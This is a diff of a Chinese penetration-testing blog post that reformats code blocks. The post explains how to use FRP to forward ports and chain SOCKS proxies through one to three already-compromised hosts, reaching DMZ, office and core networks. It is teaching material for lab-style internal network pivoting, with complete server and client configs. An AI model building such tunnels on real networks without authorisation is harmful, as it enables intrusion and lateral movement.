@@ -19,238 +19,152 @@
 <ol>
 <li>在VPS上执行以下命令，启动FRP服务端 shell</li>
 </ol>
-<pre class="line-numbers language-shell"><code class="language-shell">./frps -c ./frps.ini
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p> frps.ini内容如下： </p>
-<pre><code>[common] bind_addr = 0.0.0.0 bind_port = 7000
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[common] bind_addr = 0.0.0.0 bind_port = 7000</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在web服务器上执行以下命令，启动FRP客户端，连接vps的服务端 shell</li>
 </ul>
-<pre><code>./frpc.exe -c ./frpc.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p> frpc.ini内容如下： </p>
-<pre><code>[common] 
-server_addr = 100.100.100.10 
-server_port = 7000 
-[socks5_forward] 
-type = tcp 
-local_ip = 127.0.0.1 
-local_port = 3389 
-remote_port = 33890
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 100.100.100.10 </span><br><span class="line">server_port = 7000 </span><br><span class="line">[socks5_forward] </span><br><span class="line">type = tcp </span><br><span class="line">local_ip = 127.0.0.1 </span><br><span class="line">local_port = 3389 </span><br><span class="line">remote_port = 33890</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>将web服务器的3389端口转发到web服务器的的33890端口</strong></p>
 <ol>
 <li>在web服务器上执行以下命令，启动FRP服务端 shell</li>
 </ol>
-<pre><code>./frps -c ./frps.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p> frps.ini内容如下： </p>
-<pre><code>[common] 
-bind_addr = 0.0.0.0 
-bind_port = 7000
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_addr = 0.0.0.0 </span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在web服务器上执行以下命令，启动FRP客户端，连接vps的服务端 shell</li>
 </ul>
-<pre><code>./frpc.exe -c ./frpc.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p> frpc.ini内容如下： </p>
-<pre><code>[common] 
-server_addr = 127.0.0.1 
-server_port = 7000 
-[socks5_forward] 
-type = tcp 
-local_ip = 127.0.0.1 
-local_port = 3389 
-remote_port = 33890
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 127.0.0.1 </span><br><span class="line">server_port = 7000 </span><br><span class="line">[socks5_forward] </span><br><span class="line">type = tcp </span><br><span class="line">local_ip = 127.0.0.1 </span><br><span class="line">local_port = 3389 </span><br><span class="line">remote_port = 33890</span><br></pre></td></tr></tbody></table></figure>
+
 <h1 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h1><h2 id="FRP-1"><a href="#FRP-1" class="headerlink" title="FRP"></a>FRP</h2><p><a target="_blank" rel="noopener" href="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202302081501409.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304191117626.png" alt="img"></a></p>
 <h3 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h3><p>此时已经获得DMZ区web服务器的权限，将web服务器作为跳板打通DMZ区的网络，使得kali可以访问到FTP服务器</p>
 <p>vps -&gt; web服务器 -&gt; DMZ区网络</p>
 <ol>
 <li>使用vps作为FRP的服务端，在VPS执行shell</li>
 </ol>
-<pre><code>./frps -c ./frps.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frps.ini内容如下：</p>
-<pre><code>[common] 
-bind_addr = 0.0.0.0 
-bind_port = 7000
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_addr = 0.0.0.0 </span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>使用web服务器作为FRP客户端，执行shell</li>
 </ul>
-<pre><code>./frpc.exe -c ./frpc.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frpc.ini内容如下：</p>
-<pre><code>[common] 
-server_addr = 100.100.100.10 
-server_port = 7000 
-[socks5] 
-remote_port = 1080 
-plugin = socks5
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 100.100.100.10 </span><br><span class="line">server_port = 7000 </span><br><span class="line">[socks5] </span><br><span class="line">remote_port = 1080 </span><br><span class="line">plugin = socks5</span><br></pre></td></tr></tbody></table></figure>
+
 <p>完成后<strong>在vps上会开启socks代理端口1080</strong>，使用代理软件代理即可。</p>
 <h3 id="二级代理"><a href="#二级代理" class="headerlink" title="二级代理"></a>二级代理</h3><p>此时已经获取到DMZ区域的web服务器和FTP服务器权限，将web服务器和FTP服务器同时作为跳板，打通到达办公区的网络</p>
 <p>vps -&gt; web服务器 -&gt; FTP服务器 -&gt; 办公区网络</p>
 <ol>
 <li>在VPS上执行以下命令，启动FRP服务端shell</li>
 </ol>
-<pre><code>./frps -c ./frps.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frps.ini内容如下：</p>
-<pre><code>[common] 
-bind_addr = 0.0.0.0 
-bind_port = 7000
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_addr = 0.0.0.0 </span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在web服务器上执行以下命令，启动FRP客户端，连接vps的服务端shell</li>
 </ul>
-<pre><code>./frpc.exe -c ./frpc.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frpc.ini内容如下：</p>
 <ul>
 <li>这将本地的10808端口转发到VPS的1080端口</li>
 </ul>
-<pre><code>[common] 
-server_addr = 100.100.100.10 
-server_port = 7000 
-[socks5_forward] 
-type = tcp 
-local_ip = 10.10.10.20 
-local_port = 10808 
-remote_port = 1080
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 100.100.100.10 </span><br><span class="line">server_port = 7000 </span><br><span class="line">[socks5_forward] </span><br><span class="line">type = tcp </span><br><span class="line">local_ip = 10.10.10.20 </span><br><span class="line">local_port = 10808 </span><br><span class="line">remote_port = 1080</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在web服务器上执行以下命令，启动一个FRP服务端shell</li>
 </ul>
-<pre><code>./frps.exe -c ./frps.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frps.ini内容如下：</p>
-<pre><code>[common] 
-bind_addr = 10.10.10.20 
-bind_port = 7000
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_addr = 10.10.10.20 </span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在FTP服务器上执行以下命令，启动FRP客户端shell</li>
 </ul>
-<pre><code>./frpc.exe -c ./frpc.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frpc.ini内容如下：</p>
-<pre><code>[common] 
-server_addr = 10.10.10.20 
-server_port = 7000 
-[socks5] 
-type = tcp 
-remote_port = 10808 
-plugin = socks5
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 10.10.10.20 </span><br><span class="line">server_port = 7000 </span><br><span class="line">[socks5] </span><br><span class="line">type = tcp </span><br><span class="line">remote_port = 10808 </span><br><span class="line">plugin = socks5</span><br></pre></td></tr></tbody></table></figure>
+
 <p>完成后<strong>在vps上会开启socks代理端口1080</strong>，使用代理软件代理即可访问办公区网络。</p>
 <p><strong>最终的隧道：</strong></p>
-<pre><code>VPS（100.100.100.10）    
-监听：0.0.0.0:1080、0.0.0.0:7000     
-&lt;--&gt; web服务器（10.10.10.20）    
-连接：100.100.100.10:7000    监听：10.10.10.20:7000、10.10.10.20:10808      
-&lt;--&gt; ftp服务器（10.10.10.30、192.168.30.10）    
-连接：10.10.10.20:7000
-&lt;--&gt;办公区网络（192.168.30.0/24）
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VPS（100.100.100.10）    </span><br><span class="line">监听：0.0.0.0:1080、0.0.0.0:7000     </span><br><span class="line">&lt;--&gt; web服务器（10.10.10.20）    </span><br><span class="line">连接：100.100.100.10:7000    监听：10.10.10.20:7000、10.10.10.20:10808      </span><br><span class="line">&lt;--&gt; ftp服务器（10.10.10.30、192.168.30.10）    </span><br><span class="line">连接：10.10.10.20:7000</span><br><span class="line">&lt;--&gt;办公区网络（192.168.30.0/24）</span><br></pre></td></tr></tbody></table></figure>
+
 <h3 id="三级代理"><a href="#三级代理" class="headerlink" title="三级代理"></a>三级代理</h3><p>此时已获得DMZ区的web服务器和FTP服务器权限，以及办公区的文件服务器权限，将web服务器和FTP服务器以及文件服务器同时作为跳板，打通到达核心区的网络</p>
 <p>vps -&gt; web服务器 -&gt; FTP服务器 -&gt; 办公区文件服务器 -&gt; 核心区网络</p>
 <ol>
 <li>在VPS上启动FRP服务端shell</li>
 </ol>
-<pre><code>./frps -c ./frps.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frps.ini内容如下：</p>
-<pre><code>[common] 
-bind_addr = 0.0.0.0 
-bind_port = 7000
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_addr = 0.0.0.0 </span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在web服务器上启动FRP客户端，同时将本地的10808端口转发到VPS的1080端口shell</li>
 </ul>
-<pre><code>./frpc.exe -c ./frpc.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frpc.ini内容如下：</p>
 <ul>
 <li>这将本地的10808端口转发到VPS的1080端口</li>
 </ul>
-<pre><code>[common] 
-server_addr = 100.100.100.10 
-server_port = 7000 
-[socks5_forward] 
-type = tcp 
-local_ip = 10.10.10.20 
-local_port = 10808 
-remote_port = 1080
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 100.100.100.10 </span><br><span class="line">server_port = 7000 </span><br><span class="line">[socks5_forward] </span><br><span class="line">type = tcp </span><br><span class="line">local_ip = 10.10.10.20 </span><br><span class="line">local_port = 10808 </span><br><span class="line">remote_port = 1080</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在web服务器上启动一个FRP服务端shell</li>
 </ul>
-<pre><code>./frps.exe -c ./frps.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frps.ini内容如下：</p>
-<pre><code>[common] 
-bind_addr = 10.10.10.20 
-bind_port = 7000
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_addr = 10.10.10.20 </span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在FTP服务器上启动FRP客户端，连接web服务器的FRP服务端，同时将FTP服务端的10809端口转发到Web服务器的10808端口shell</li>
 </ul>
-<pre><code>./frpc.exe -c ./frpc.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frpc.ini内容如下：</p>
-<pre><code>[common] 
-server_addr = 10.10.10.20 
-server_port = 7000 
-[socks5_forward] 
-type = tcp 
-local_ip = 192.168.30.10 
-local_port = 10809 
-remote_port = 10808
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 10.10.10.20 </span><br><span class="line">server_port = 7000 </span><br><span class="line">[socks5_forward] </span><br><span class="line">type = tcp </span><br><span class="line">local_ip = 192.168.30.10 </span><br><span class="line">local_port = 10809 </span><br><span class="line">remote_port = 10808</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在FTP服务器上启动FRP服务端shell</li>
 </ul>
-<pre><code>./frps.exe -c ./frps.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frps.ini内容如下：</p>
-<pre><code>[common] 
-bind_addr = 192.168.30.10 
-bind_port = 7000
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_addr = 192.168.30.10 </span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></tbody></table></figure>
+
 <ul>
 <li>在办公区的文件服务器上启动FRP客户端，连接FTP服务器的服务端，并在FTP服务器的10809端口上启动socks5代理服务shell</li>
 </ul>
-<pre><code>./frpc.exe -c ./frpc.ini
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></tbody></table></figure>
+
 <p>frpc.ini内容如下：</p>
-<pre><code>[common] 
-server_addr = 192.168.30.10 
-server_port = 7000 
-[socks5] type = tcp 
-remote_port = 10809 
-plugin = socks5
-</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 192.168.30.10 </span><br><span class="line">server_port = 7000 </span><br><span class="line">[socks5] type = tcp </span><br><span class="line">remote_port = 10809 </span><br><span class="line">plugin = socks5</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>最终的隧道：</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">VPS（100.100.100.10）
-    监听：0.0.0.0:1080、0.0.0.0:7000
-    
-<--> web服务器（10.10.10.20）
-    连接：100.100.100.10:7000
-    监听：10.10.10.20:7000、10.10.10.20:10808 
-    
-<--> ftp服务器（10.10.10.30、192.168.30.10）
-    连接：10.10.10.20:7000
-    监听：192.168.30.10:10809 、192.168.30.10:7000 
-    
-<--> 文件服务器（192.168.30.100、192.168.60.100）
-    连接：192.168.30.10:7000 
-    
-<-->核心区网络（192.168.60.0/24）
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">VPS（100.100.100.10）</span><br><span class="line">    监听：0.0.0.0:1080、0.0.0.0:7000</span><br><span class="line">    </span><br><span class="line">&lt;--&gt; web服务器（10.10.10.20）</span><br><span class="line">    连接：100.100.100.10:7000</span><br><span class="line">    监听：10.10.10.20:7000、10.10.10.20:10808 </span><br><span class="line">    </span><br><span class="line">&lt;--&gt; ftp服务器（10.10.10.30、192.168.30.10）</span><br><span class="line">    连接：10.10.10.20:7000</span><br><span class="line">    监听：192.168.30.10:10809 、192.168.30.10:7000 </span><br><span class="line">    </span><br><span class="line">&lt;--&gt; 文件服务器（192.168.30.100、192.168.60.100）</span><br><span class="line">    连接：192.168.30.10:7000 </span><br><span class="line">    </span><br><span class="line">&lt;--&gt;核心区网络（192.168.60.0/24）</span><br></pre></td></tr></tbody></table></figure>
 </div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:1916003479@qq.com">uf9n1x</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://uf9n1x.top/2023/04/19/nei-wang-shen-tou-qi-frp-duan-kou-zhuan-fa-yu-nei-wang-dai-li/">https://uf9n1x.top/2023/04/19/nei-wang-shen-tou-qi-frp-duan-kou-zhuan-fa-yu-nei-wang-dai-li/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://uf9n1x.top">Uf9n1x's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%90%86/">代理</a><a class="post-meta__tags" href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">端口转发</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2023/04/19/javasec-san-lei-jia-zai-ji-zhi/"><i class="fa fa-chevron-left">  </i><span>javasec(三)类加载机制</span></a></div><div class="next-post pull-right"><a href="/2023/04/18/javasec-qi-jndi/"><span>javasec(七)JNDI注入</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://blog-1313934826.cos.ap-chengdu.myqcloud.com/normal-images/psc.png#https://s1.ax1x.com/2023/04/14/p9Sd0ns.png)"><div class="layout" id="footer"><div class="copyright">&copy;2023 By uf9n1x</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
